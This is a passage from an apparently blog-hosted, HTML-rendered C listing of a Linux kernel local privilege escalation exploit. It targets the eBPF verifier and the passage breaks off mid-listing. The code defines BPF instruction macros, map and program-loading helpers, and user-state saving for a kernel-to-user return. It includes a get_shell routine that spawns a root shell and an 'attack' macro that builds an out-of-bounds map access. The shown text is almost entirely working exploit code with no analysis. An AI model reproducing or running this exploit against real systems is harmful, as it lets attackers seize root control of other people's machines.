class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_REG BPF_REG_7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE_REG BPF_REG_6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(oob_map_fd, store_map_fd)                                     \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                                           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        